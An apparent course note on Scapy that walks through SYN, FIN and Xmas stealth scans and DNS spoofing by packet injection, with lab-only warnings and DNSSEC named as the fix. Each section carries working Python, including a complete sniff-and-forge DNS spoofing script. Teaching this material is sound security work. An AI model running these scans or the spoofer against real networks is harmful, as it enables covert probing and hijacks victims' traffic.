### Advanced Scapy -- Stealth Scans and DNS Spoofing

--> `04 Packet Crafting and Sniffing with Scapy.md` covered Scapy's fundamentals -- layer stacking, `sr1()`/`srp()`, ARP scanning, BPF filters. This file builds on that base with the specific packet-crafting techniques behind nmap-style stealth scan types and DNS spoofing via packet injection.

## LEGAL AND ETHICAL WARNING

--> Everything below is significantly more intrusive than the ARP scanning and ICMP ping in `04` -- stealth scans are explicitly designed to probe firewall/IDS behavior, and DNS spoofing actively redirects a victim's traffic. Run these ONLY against your own lab VMs on an isolated network (a VirtualBox/VMware host-only network, exactly as `04` recommends) that you fully own and control. DNS spoofing on any network you don't own, even "just to see if it works," intercepts traffic that isn't yours and is squarely inside computer-misuse-law territory in essentially every jurisdiction.

## Recap: the normal TCP handshake, and why stealth scans avoid completing it

--> A normal `connect()`-based scan (as in `01`/`09`) completes the FULL three-way handshake for every port it checks -- this is reliable but leaves an obvious complete-connection log entry on the target for every single port probed, exactly what an IDS/firewall is tuned to notice.
--> The stealth scan family instead sends only the FIRST packet of a probe and inspects the response, WITHOUT ever completing the handshake -- avoiding a fully-logged connection while still learning the port's state from how the target responds (or doesn't).

## SYN scan (`-sS` equivalent)

--> Sends a single TCP SYN packet, exactly like the first step of a real handshake, then inspects the reply -- but the SCANNER never sends the final ACK, so many logging systems (specifically ones that only log on a COMPLETED connection) never notice a scan happened at all -- which is why this technique is called "half-open" scanning.

```python
from scapy.all import IP, TCP, sr1

def syn_scan_port(target, port, timeout=2):
    pkt = IP(dst=target) / TCP(dport=port, flags="S")
    reply = sr1(pkt, timeout=timeout, verbose=0)

    if reply is None:
        return "filtered"                       # no response at all -- likely dropped by a firewall
    elif reply.haslayer(TCP):
        flags = reply[TCP].flags
        if flags == 0x12:            # SYN-ACK (0x12 = SYN + ACK bits set)
            # Send a RST to tear down cleanly WITHOUT ever completing the handshake --
            # this is the step that makes it "half-open" rather than a full connect scan
            rst = IP(dst=target) / TCP(dport=port, flags="R", seq=reply[TCP].ack)
            sr1(rst, timeout=1, verbose=0)
            return "open"
        elif flags == 0x14:          # RST-ACK (0x14 = RST + ACK bits set)
            return "closed"
    return "unknown"

print(syn_scan_port("192.168.56.10", 80))   # against your own lab VM only
```

--> Requires raw socket privileges (root/Administrator) exactly like the raw sockets covered in `10 Raw Sockets and Packet Construction with struct.md`, for the same underlying reason -- crafting a TCP packet without going through the OS's normal connect-oriented socket API needs that elevated access.

## FIN scan

--> Sends a bare FIN packet (no prior SYN at all) to a port. Per RFC 793, a CLOSED port receiving an unexpected FIN with no established connection should respond with RST; an OPEN port, on most Unix-like TCP stacks, is specified to simply IGNORE an out-of-context FIN and send nothing back at all.

```python
from scapy.all import IP, TCP, sr1

def fin_scan_port(target, port, timeout=2):
    pkt = IP(dst=target) / TCP(dport=port, flags="F")
    reply = sr1(pkt, timeout=timeout, verbose=0)

    if reply is None:
        return "open|filtered"   # no reply is AMBIGUOUS here -- could genuinely be open (per spec,
                                  # silently ignored) or could be filtered by a firewall dropping it;
                                  # a FIN scan cannot distinguish these two cases from each other
    elif reply.haslayer(TCP) and reply[TCP].flags == 0x14:   # RST-ACK
        return "closed"
    return "unknown"
```

--> The historical value of this technique: many older/simpler firewall rulesets were written to block/flag SYN packets specifically (since that's what a "normal" scan or connection attempt looks like) while never considering a bare FIN -- letting a FIN scan slip through undetected where a SYN scan would have been blocked or logged. Modern stateful firewalls (covered in `08 BGP, OSPF, VLANs and VPN Architectures.md`) generally track connection state well enough to catch an out-of-context FIN too, so this specific evasion is much less reliable against current infrastructure -- worth knowing as a concept and for why it appears in every scanning tool's technique list, but it is not a way to reliably beat a modern setup.

## Xmas scan

--> Sets THREE flags simultaneously -- FIN, PSH, and URG -- which is why it's called "Xmas" (the packet is "lit up like a Christmas tree" with flags). The detection logic and the exact same ambiguity as the FIN scan apply identically -- it's really the same RFC 793 out-of-context-flag behavior, just triggered with more flags set at once, historically used specifically because some early intrusion detection systems were tuned to catch a bare FIN scan but not this less common flag combination.

```python
from scapy.all import IP, TCP, sr1

def xmas_scan_port(target, port, timeout=2):
    pkt = IP(dst=target) / TCP(dport=port, flags="FPU")   # FIN + PSH + URG
    reply = sr1(pkt, timeout=timeout, verbose=0)

    if reply is None:
        return "open|filtered"      # same fundamental ambiguity as the FIN scan above
    elif reply.haslayer(TCP) and reply[TCP].flags == 0x14:
        return "closed"
    return "unknown"
```

--> All three techniques above share the same underlying pattern worth internalizing rather than memorizing each one separately: craft a packet the TARGET's TCP stack was never expecting in that connection state, and infer the port's status from whatever RFC-defined (or stack-specific, in practice) behavior that unexpected packet triggers, exploiting a gap between what a firewall/IDS was specifically tuned to notice (SYN-based activity) and what the RFC actually obligates a normal TCP stack to do.

## DNS Spoofing via Packet Injection

--> DNS normally resolves over UDP with no authentication of WHICH server actually answered a query -- a client trusts whichever response arrives first with a matching transaction ID, matching source port, and matching query, back to the address it sent the request to. DNS spoofing exploits exactly that lack of authentication: if an attacker can see a victim's DNS query (e.g. by being on the same LAN, often combined with ARP spoofing to redirect traffic through the attacker first) and can craft/send a forged response FASTER than the legitimate DNS server's real answer arrives, the victim's resolver accepts the forged answer instead.

```python
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sniff, send

FAKE_IP = "192.168.56.1"        # the attacker's own lab-controlled IP -- redirect target
TARGET_DOMAIN = b"example.com."  # note the trailing dot -- DNS queries are FQDN-terminated this way

def spoof_dns(packet):
    if packet.haslayer(DNSQR) and packet[DNSQR].qname == TARGET_DOMAIN:
        # Build a forged response reusing the ORIGINAL query's IP/UDP addressing (swapped)
        # and, critically, the SAME transaction ID (packet[DNS].id) -- a resolver rejects
        # any response whose ID doesn't match the query it actually sent
        spoofed_response = (
            IP(dst=packet[IP].src, src=packet[IP].dst) /
            UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
            DNS(
                id=packet[DNS].id,
                qr=1,                       # qr=1 marks this as a response, not a query
                aa=1,                       # claim to be an authoritative answer
                qd=packet[DNS].qd,          # echo back the original question section unchanged
                an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=FAKE_IP),
            )
        )
        send(spoofed_response, verbose=0)
        print(f"[+] Sent spoofed DNS response: {TARGET_DOMAIN.decode()} -> {FAKE_IP}")

# Sniff for outgoing DNS queries on the lab network and race a forged answer against the real server
sniff(filter="udp port 53", prn=spoof_dns, store=0)
```

--> This ONLY works at all because the attacker's forged packet has to WIN A RACE against the legitimate DNS server's genuine response -- on a LAN where the attacker is closer to the victim than the real DNS server is, or where the attacker has already positioned themselves in-path (via ARP spoofing so the victim's traffic physically flows through the attacker first), this race is easy to win reliably; over the open internet, without that positioning, blind DNS spoofing is far less reliable, which is exactly why DNS cache poisoning attacks historically focused heavily on predicting/brute-forcing the transaction ID and source port rather than simply racing a visible query.
--> **DNSSEC** (mentioned in `07 NAS, SAN, IPAM and Secure Protocol Variants.md`'s secure protocol variants) is the actual structural fix for this class of attack -- it adds cryptographic signatures to DNS responses, so a resolver can verify a response really came from the legitimate authoritative server rather than trusting "whichever answer arrived first with the right transaction ID," which is the entire vulnerability this technique exploits. Plain DNS as demonstrated above has no such protection at all.

## Cross-references

--> Builds directly on `04 Packet Crafting and Sniffing with Scapy.md` (layer stacking, `sr1()`, `sniff()`, BPF filters) and the raw TCP header/flag-byte construction covered manually in `10 Raw Sockets and Packet Construction with struct.md` -- the flag values (`0x12`, `0x14`) used for reply interpretation above are exactly the same SYN/ACK/RST bit positions assembled by hand there. The stateful-vs-stateless firewall distinction referenced for why FIN/Xmas scans are less effective today is covered in `08 BGP, OSPF, VLANs and VPN Architectures.md` in the Computer Networks folder, and DNSSEC as the structural fix for DNS spoofing is covered in `07 NAS, SAN, IPAM and Secure Protocol Variants.md` in that same folder.
